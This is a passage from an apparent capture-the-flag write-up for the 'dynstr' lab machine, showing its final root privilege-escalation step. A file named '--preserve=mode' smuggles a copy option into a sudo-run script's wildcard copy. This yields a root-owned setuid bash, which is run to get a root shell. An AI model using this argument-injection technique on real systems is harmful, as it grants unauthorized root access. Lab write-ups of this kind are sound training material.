-rwsrwxrwx  1 bindmgr  bindmgr  1.2M Nov  5 21:06  bash
-rw-------  1 www-data www-data 1.8K Nov  5 20:06  id_rsa
-rw-rw-r--  1 bindmgr  bindmgr     0 Nov  5 21:07 '--preserve=mode'
-rw-rw-r--  1 bindmgr  bindmgr     3 Nov  5 21:09  .version
```

- Now everything is ready
  - Run the script
```
bindmgr@dynstr:/dev/shm$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
    /etc/bind/named.bindmgr/bash:14: unknown option 'h�ȀE�'
    /etc/bind/named.bindmgr/bash:40: unknown option '�YF'
    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'

```

- We receive errors
  - But if we check the folder, we have a `bash` file owned by `root` with `suid` bit set
  - Run it with `-p` and get the flag
```
bindmgr@dynstr:/dev/shm$ ls -lha /etc/bind/named.bindmgr/
total 1.2M
drwxr-sr-x 2 root bind 4.0K Nov  5 21:09 .
drwxr-sr-x 3 root bind 4.0K Nov  5 21:09 ..
-rwsrwxrwx 1 root bind 1.2M Nov  5 21:09 bash
-rw------- 1 root bind 1.8K Nov  5 21:09 id_rsa
-rw-rw-r-- 1 root bind    3 Nov  5 21:09 .version

```
```
bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p
bash-5.0# whoami
root
```

